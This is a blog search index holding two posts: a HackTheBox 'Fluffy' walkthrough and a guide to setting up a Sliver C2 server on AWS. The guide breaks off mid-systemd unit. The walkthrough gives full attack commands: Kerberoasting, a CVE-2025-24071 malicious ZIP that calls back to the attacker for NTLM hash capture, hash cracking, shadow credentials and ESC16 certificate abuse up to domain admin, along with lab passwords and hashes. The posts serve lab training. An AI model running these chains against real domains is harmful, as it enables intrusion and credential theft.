<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HTB-Fluffy</title>
      <link href="/2025/10/17/HTB-Fluffy/"/>
      <url>/2025/10/17/HTB-Fluffy/</url>
      
        <content type="html"><![CDATA[<h1 id="HTB-Fluffy-Complete-Penetration-Testing-Walkthrough"><a href="#HTB-Fluffy-Complete-Penetration-Testing-Walkthrough" class="headerlink" title="HTB Fluffy - Complete Penetration Testing Walkthrough"></a>HTB Fluffy - Complete Penetration Testing Walkthrough</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This is a comprehensive walkthrough and writeup for the HackTheBox (HTB) machine “Fluffy” - an Active Directory environment that demonstrates real-world attack vectors including Kerberoasting, NTLM hash capture, certificate abuse (ESC16), and privilege escalation techniques. This writeup covers the complete penetration testing methodology from initial reconnaissance to domain administrator access.</p><p><strong>Tools Used:</strong> Nmap, NetExec, Impacket, Bloodhound, Hashcat, Responder, BloodyAD, Certipy, Evil-WinRM</p><p><strong>Difficulty:</strong> Easy</p><p><strong>Key Techniques:</strong> Active Directory enumeration, Kerberoasting, CVE-2025-24071 exploitation, NTLM relay, certificate template abuse (ESC16), shadow credentials</p><hr><h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><h3 id="Starting-Credentials"><a href="#Starting-Credentials" class="headerlink" title="Starting Credentials"></a>Starting Credentials</h3><p>We begin with the following credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">j.fleischman / J0elTHEM4n1990!</span><br></pre></td></tr></table></figure><h3 id="Port-Scanning"><a href="#Port-Scanning" class="headerlink" title="Port Scanning"></a>Port Scanning</h3><p>First, we perform a comprehensive port scan of the target:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -Pn -p- 10.129.232.88 -vvvv</span><br></pre></td></tr></table></figure><p>For UDP scanning:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">udpx -t 10.129.232.88</span><br></pre></td></tr></table></figure><p><strong>Scan Results:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON  VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-10-16 14:21:05Z)</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack Microsoft Windows Active </span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over </span><br><span class="line">3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.fluffy.htb.</span><br><span class="line">3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active </span><br><span class="line">5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49693/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49694/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49701/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49714/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49727/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-10-16T14:21:54</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 44288/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 10639/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 35164/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 32180/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br></pre></td></tr></table></figure><p>The scan reveals a Windows Domain Controller running Active Directory services.</p><hr><h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><h3 id="Guest-Access-Discovery"><a href="#Guest-Access-Discovery" class="headerlink" title="Guest Access Discovery"></a>Guest Access Discovery</h3><p>We discovered that the guest user is enabled:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.129.232.88 -u &quot;guest&quot; -p &quot;&quot; --shares</span><br></pre></td></tr></table></figure><h3 id="SID-Brute-Force"><a href="#SID-Brute-Force" class="headerlink" title="SID Brute Force"></a>SID Brute Force</h3><p>Using Impacket, we brute force the SIDs to enumerate users:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid -no-pass fluffy.htb/panos@DC01.fluffy.htb</span><br></pre></td></tr></table></figure><p>Alternatively, using NetExec:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.129.232.88 -u &quot;panos&quot; -p &quot;&quot; --rid-brute</span><br></pre></td></tr></table></figure><p><img src="/images/HTB-Fluffy/Null_Ses_Fluffy.png" alt="Null session SID enumeration results"></p><hr><h2 id="Kerberoasting-Attack"><a href="#Kerberoasting-Attack" class="headerlink" title="Kerberoasting Attack"></a>Kerberoasting Attack</h2><h3 id="Clock-Skew-Fix"><a href="#Clock-Skew-Fix" class="headerlink" title="Clock Skew Fix"></a>Clock Skew Fix</h3><p>Before attempting Kerberoasting, we need to synchronize our clock with the domain controller:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ntpdate 10.129.232.88</span><br></pre></td></tr></table></figure><h3 id="Extracting-Service-Account-Hashes"><a href="#Extracting-Service-Account-Hashes" class="headerlink" title="Extracting Service Account Hashes"></a>Extracting Service Account Hashes</h3><p>Using NetExec with our valid credentials to perform Kerberoasting (remember to add the FQDN to <code>/etc/hosts</code>):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap dc01.fluffy.htb -u j.fleischman -p &#x27;J0elTHEM4n1990!&#x27; --kerberoasting output.txt</span><br></pre></td></tr></table></figure><p>We successfully retrieved three Kerberos TGS hashes for the following service accounts:</p><ul><li><code>ca_svc</code></li><li><code>ldap_svc</code></li><li><code>winrm_svc</code></li></ul><p><img src="/images/HTB-Fluffy/kerberoast-Fluffy.png" alt="Kerberoasting results showing three service account hashes"></p><h3 id="Hash-Cracking-Attempt"><a href="#Hash-Cracking-Attempt" class="headerlink" title="Hash Cracking Attempt"></a>Hash Cracking Attempt</h3><p>We attempt to crack the hashes using Hashcat with mode 13100 (Kerberos TGS-REP):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>Unfortunately, none of the hashes cracked with the rockyou wordlist.</p><hr><h2 id="Bloodhound-Enumeration"><a href="#Bloodhound-Enumeration" class="headerlink" title="Bloodhound Enumeration"></a>Bloodhound Enumeration</h2><p>We run a Bloodhound ingestor to collect Active Directory data for analysis:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap dc01.fluffy.htb -u j.fleischman -p &#x27;J0elTHEM4n1990!&#x27; --bloodhound --collection All --dns-server 10.129.232.88</span><br></pre></td></tr></table></figure><p>After analyzing the Bloodhound data, we didn’t find any immediate privilege escalation paths for the user <code>j.fleischman</code>.</p><hr><h2 id="SMB-Share-Exploration"><a href="#SMB-Share-Exploration" class="headerlink" title="SMB Share Exploration"></a>SMB Share Exploration</h2><h3 id="Share-Enumeration"><a href="#Share-Enumeration" class="headerlink" title="Share Enumeration"></a>Share Enumeration</h3><p>We enumerate accessible SMB shares:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb dc01.fluffy.htb -u j.fleischman -p &#x27;J0elTHEM4n1990!&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/HTB-Fluffy/shares-fluffy.png" alt="SMB share enumeration showing the IT share with READ and WRITE permissions"></p><p>We discovered an interesting share called <strong>IT</strong> with both READ and WRITE permissions. This is a goldmine for potential attacks.</p><h3 id="Accessing-the-IT-Share"><a href="#Accessing-the-IT-Share" class="headerlink" title="Accessing the IT Share"></a>Accessing the IT Share</h3><p>We connect to the IT share using smbclient:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -U j.fleischman@fluffy.htb //fluffy.htb/IT</span><br></pre></td></tr></table></figure><p><img src="/images/HTB-Fluffy/share-IT-fluffy.png" alt="Contents of the IT share showing a PDF file"></p><p>We find a PDF file named <code>Upgrade_Notice.pdf</code>. Let’s download it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get Upgrade_Notice.pdf</span><br></pre></td></tr></table></figure><hr><h2 id="CVE-2025-24071-Exploitation"><a href="#CVE-2025-24071-Exploitation" class="headerlink" title="CVE-2025-24071 Exploitation"></a>CVE-2025-24071 Exploitation</h2><h3 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h3><p>Upon examining the PDF, we discover it contains a vulnerability report mentioning several CVEs, including <strong>CVE-2025-24071</strong>.</p><p><img src="/images/HTB-Fluffy/Vuln-Report.png" alt="Vulnerability report showing CVE-2025-24071"></p><p>After researching this CVE, we find a public proof-of-concept (POC) exploit available on GitHub.</p><h3 id="Exploit-Preparation"><a href="#Exploit-Preparation" class="headerlink" title="Exploit Preparation"></a>Exploit Preparation</h3><p>Clone the exploit repository:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ThemeHackers/CVE-2025-24071.git</span><br></pre></td></tr></table></figure><p>Install the required dependencies:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>Generate a malicious ZIP file that will capture NTLM hashes when opened:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -f malware.zip -i [Your IP Here]</span><br></pre></td></tr></table></figure><h3 id="NTLM-Hash-Capture"><a href="#NTLM-Hash-Capture" class="headerlink" title="NTLM Hash Capture"></a>NTLM Hash Capture</h3><p>Start Responder to capture incoming NTLM authentication attempts:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0</span><br></pre></td></tr></table></figure><p>Upload the malicious ZIP file to the IT share:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put exploit.zip</span><br></pre></td></tr></table></figure><p>We wait for a user to interact with the file. Shortly after, Responder captures an NTLM hash!</p><p><img src="/images/HTB-Fluffy/ntlm-hash-fluffy.png" alt="Responder capturing NTLM hash from user p.agila"></p><h3 id="Hash-Cracking"><a href="#Hash-Cracking" class="headerlink" title="Hash Cracking"></a>Hash Cracking</h3><p>We crack the captured NTLMv2 hash using Hashcat:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/images/HTB-Fluffy/hachat-fluffy.png" alt="Hashcat successfully cracking the password"></p><p><strong>Cracked Credentials:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.agila:prometheusx-303</span><br></pre></td></tr></table></figure><hr><h2 id="Privilege-Escalation-via-Service-Accounts"><a href="#Privilege-Escalation-via-Service-Accounts" class="headerlink" title="Privilege Escalation via Service Accounts"></a>Privilege Escalation via Service Accounts</h2><h3 id="Bloodhound-Path-Analysis"><a href="#Bloodhound-Path-Analysis" class="headerlink" title="Bloodhound Path Analysis"></a>Bloodhound Path Analysis</h3><p>With our new credentials, we return to Bloodhound and discover a clear privilege escalation path.</p><p><img src="/images/HTB-Fluffy/Bloodhoudn-Path-fluffy.png" alt="Bloodhound showing path to domain compromise"></p><p>The path shows that <code>p.agila</code> can add themselves to the <strong>Service Accounts</strong> group, which grants access to service account privileges.</p><h3 id="Adding-User-to-Service-Accounts-Group"><a href="#Adding-User-to-Service-Accounts-Group" class="headerlink" title="Adding User to Service Accounts Group"></a>Adding User to Service Accounts Group</h3><p>Using BloodyAD, we add <code>p.agila</code> to the Service Accounts group:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD -u p.agila -p &#x27;prometheusx-303&#x27; -d fluffy.htb --host [IP] add groupMember &#x27;service accounts&#x27; p.agila</span><br></pre></td></tr></table></figure><h3 id="Shadow-Credentials-Attack"><a href="#Shadow-Credentials-Attack" class="headerlink" title="Shadow Credentials Attack"></a>Shadow Credentials Attack</h3><p>Now that we’re in the Service Accounts group, we can use Certipy to perform a shadow credentials attack and extract NTLM hashes for service accounts.</p><p>For the <code>winrm_svc</code> account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy shadow auto -u &#x27;p.agila@fluffy.htb&#x27; -p &#x27;prometheusx-303&#x27; -account winrm_svc -dc-ip 10.129.232.88</span><br></pre></td></tr></table></figure><p>For the <code>ca_svc</code> account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy shadow auto -u &#x27;p.agila@fluffy.htb&#x27; -p &#x27;prometheusx-303&#x27; -account ca_svc -dc-ip 10.129.232.88</span><br></pre></td></tr></table></figure><p><img src="/images/HTB-Fluffy/certipy_shadow-fluffy.png" alt="Certipy shadow credentials attack results"></p><p><strong>Extracted NTLM Hashes:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm_svc:33bd09dcd697600edf6b3a7af4875767</span><br><span class="line">ca_svc:ca0f4f9e9eb8a092addf53bb03fc98c8</span><br></pre></td></tr></table></figure><h3 id="User-Flag-Access"><a href="#User-Flag-Access" class="headerlink" title="User Flag Access"></a>User Flag Access</h3><p>With the <code>winrm_svc</code> hash, we can connect via WinRM and retrieve the user flag from the desktop:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767 -i 10.129.232.88</span><br></pre></td></tr></table></figure><hr><h2 id="Domain-Administrator-Privilege-Escalation"><a href="#Domain-Administrator-Privilege-Escalation" class="headerlink" title="Domain Administrator Privilege Escalation"></a>Domain Administrator Privilege Escalation</h2><h3 id="Certificate-Authority-Enumeration"><a href="#Certificate-Authority-Enumeration" class="headerlink" title="Certificate Authority Enumeration"></a>Certificate Authority Enumeration</h3><p>Using the <code>ca_svc</code> credentials, we scan for vulnerable certificate templates:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -vulnerable</span><br></pre></td></tr></table></figure><p>The scan reveals an <strong>ESC16</strong> vulnerability in the certificate templates.</p><h3 id="ESC16-Exploitation"><a href="#ESC16-Exploitation" class="headerlink" title="ESC16 Exploitation"></a>ESC16 Exploitation</h3><p><strong>Step 1:</strong> Update the UPN of <code>ca_svc</code> to <code>administrator</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy account -u &#x27;p.agila&#x27; -p &#x27;prometheusx-303&#x27; -dc-ip 10.129.232.88 -user ca_svc -upn administrator update</span><br></pre></td></tr></table></figure><p><strong>Step 2:</strong> Request a certificate for the administrator account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca FLUFFY-DC01-CA -template User -upn administrator -dc-ip 10.129.232.88</span><br></pre></td></tr></table></figure><p><strong>Step 3:</strong> Revert the UPN back to normal:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy account -u &#x27;p.agila&#x27; -p &#x27;prometheusx-303&#x27; -dc-ip 10.129.232.88 -user ca_svc -upn ca_svc  update</span><br></pre></td></tr></table></figure><p><strong>Step 4:</strong> Authenticate using the certificate to retrieve the administrator hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -dc-ip 10.129.232.88 -pfx administrator.pfx -username administrator -domain fluffy.htb</span><br></pre></td></tr></table></figure><h3 id="Domain-Administrator-Access"><a href="#Domain-Administrator-Access" class="headerlink" title="Domain Administrator Access"></a>Domain Administrator Access</h3><p>Finally, we use the administrator hash to connect via WinRM and retrieve the root flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u administrator -H ################# -i 10.129.232.88</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWS and Sliver C2 setup</title>
      <link href="/2025/06/29/AWS-and-Sliver-C2-setup/"/>
      <url>/2025/06/29/AWS-and-Sliver-C2-setup/</url>
      
        <content type="html"><![CDATA[<h1 id="Specifications"><a href="#Specifications" class="headerlink" title="Specifications"></a>Specifications</h1><ol><li>EC2 instance –&gt; t2.micro</li><li>OS –&gt; Ubuntu 20.04LTS (Focal Fossa)</li><li>Go Version –&gt; go1.24.4 linux&#x2F;amd64</li><li>Sliver Version –&gt; v1.5.43</li><li>Mingw Version –&gt; 12.2.0-14+</li><li>Metasploit Version –&gt; 6.4.71-dev-</li></ol><p>Firts we need an AWS free if you dont have one search on google “AWS Free account”<br>and the firts resault will give you the link to create one.</p><p><img src="/images/sliveraws/sliverimage.jpeg" alt="sliver image"></p><h2 id="1-Create-a-budget"><a href="#1-Create-a-budget" class="headerlink" title="1) Create a budget"></a>1) Create a budget</h2><p>We will be crating a daily budget for our account so IF we ever leave our sliver c2 (EC2) running we will get a alert on our mail to go and close it if we dont use it, so we avoid unwanted costs. As we are using t2.micro the free EC2 aws provides us we wont get any big costs so we will set our budget very low just to catch the instance from over running.<br>There are 2 ways, the “Zero Budget Cost” OR the “Custom budget” option I will be covering the “Custom budget” as the other is just two clicks.</p><p>First on the search-bar search for <code>Budgets</code></p><p><img src="/images/sliveraws/budgets.png" alt="Budget"></p><p>Then click on create a new budget, now the followoing, select “Customize (advanced)” then “Cost budget - Recommended” and click NEXT. Now we input a name like <code>Sliver Budget</code> set our Period to daily and set our budget to <code>0.10</code> this depends on your choise of budgeting for me <code>0.10</code> is a good number please adjust accordingly to your needs and how save you want to be. OR if you dont want to do the setup just select <code>My Zero-Spend Budget</code> that AWS offers.</p><h2 id="2-EC2"><a href="#2-EC2" class="headerlink" title="2) EC2"></a>2) EC2</h2><p>Find a region that maches your needs and start and EC2 instance, give it a name, select Debian as the OS, double check it will use t2.micro.Create a Key pair and downlod the file. Now when selecting the security group if you want better OpSec create a security group with yout IP so you can only ssh and access that machine(for now) also allow https and http traffic into it(If you dont want to create a new custom security group just select MY IP)<br>Now on your machine do <code>sudo chmod 400 &lt;name of key&gt;.pem </code><br>Wait for the instance to start and ssh into it using the key you have</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i &quot;&lt;NAME&gt;.pem&quot; admin@&lt;Public IP&gt;</span><br></pre></td></tr></table></figure><h3 id="Go-Installation"><a href="#Go-Installation" class="headerlink" title="Go Installation"></a>Go Installation</h3><p>We need to to be able to install Sliver C2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://golang.org/dl/go1.24.4.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xf go1.24.4.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure><p>Move the Go binary directory to <code> /usr/local/go</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv go /usr/local/go</span><br></pre></td></tr></table></figure><p>Add the Go bin directory to your PATH environment variable:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo echo &#x27;export PATH=$PATH:/usr/local/go/bin&#x27; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure><p>Reload your <code>.bashrc</code> file to apply changes:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><p>Test if the install was succesfull</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go version</span><br></pre></td></tr></table></figure><h3 id="Mingw-Installation"><a href="#Mingw-Installation" class="headerlink" title="Mingw Installation"></a>Mingw Installation</h3><p>We need Mingw as it enable shellcode&#x2F;staged&#x2F;DLL payloads</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install mingw-w64</span><br></pre></td></tr></table></figure><h3 id="Metasploit-Installation"><a href="#Metasploit-Installation" class="headerlink" title="Metasploit Installation"></a>Metasploit Installation</h3><p>Metasploit is needed for some integrations for Sliver</p><p>Firts some dependencies to run the one liner rabbit7 gives us</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y gnupg2 dirmngr apt-transport-https ca-certificates curl</span><br></pre></td></tr></table></figure><p>then</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br></pre></td></tr></table></figure><p>After the installation completes, open a terminal window and type the following to start msfconsole:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p>Source: <a href="https://docs.rapid7.com/metasploit/installing-the-metasploit-framework/">https://docs.rapid7.com/metasploit/installing-the-metasploit-framework/</a></p><p><img src="/images/sliveraws/msfConsole.png" alt="Console"></p><h3 id="Sliver"><a href="#Sliver" class="headerlink" title="Sliver"></a>Sliver</h3><p>Now that all that dependencies are installed it was time to download the <code>sliver</code> binaries.<br>Server:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/BishopFox/sliver/releases/download/v1.5.43/sliver-server_linux</span><br><span class="line">wget https://github.com/BishopFox/sliver/releases/download/v1.5.43/sliver-server_linux.sig</span><br></pre></td></tr></table></figure><p>Client(for now local)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/BishopFox/sliver/releases/download/v1.5.43/sliver-client_linux</span><br><span class="line">wget https://github.com/BishopFox/sliver/releases/download/v1.5.43/sliver-client_linux.sig</span><br></pre></td></tr></table></figure><p>And made the binaries executables.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 755 sliver-server_linux</span><br><span class="line">sudo chmod 755 sliver-client_linux</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chown admin:admin sliver-server_linux</span><br><span class="line">sudo chown admin:admin sliver-client_linux</span><br></pre></td></tr></table></figure><p>also wourd recommend not to use admin user for this and create another use that runs sliver but for now this does the job.</p><p>Next up the verification of these binaries was also necessary. Ideally, it should be done right after downloading binaries.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/BishopFox/sliver/master/server/assets/fs/sliver.asc</span><br><span class="line">gpg --import sliver.asc</span><br><span class="line">gpg --verify sliver-server_linux.sig ../sliver/sliver-server_linux</span><br><span class="line">gpg --verify sliver-server_linux.sig ../sliver/sliver-client_linux</span><br></pre></td></tr></table></figure><p>You should see</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Good signature from &quot;Sliver &lt;sliver@bishopfox.com&gt;&quot; [unknown]</span><br></pre></td></tr></table></figure><p>Start the sliver server <code>sliver-server_linux</code> and type the following</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new-operator --name HelloWorld -l 127.0.0.1</span><br></pre></td></tr></table></figure><p>Exit the server and now load the .cfg file into the sliver-agent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sliver-client_linux import HelloWorld_127.0.0.1.cfg</span><br></pre></td></tr></table></figure><p>Now its a good time to setup a service that will run the sliver-server so we can connect to it</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sudo tee /etc/systemd/system/sliver-server.service &lt;&lt;EOF</span><br><span class="line">[Unit]</span><br><span class="line">Description=Sliver</span><br><span class="line">After=network.target</span><br><span class="line">StartLimitIntervalSec=0</span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartSec=3</span><br><span class="line">User=admin</span><br><span class="line">ExecStart=/home/admin/sliver/sliver-server_linux daemon</span><br><span 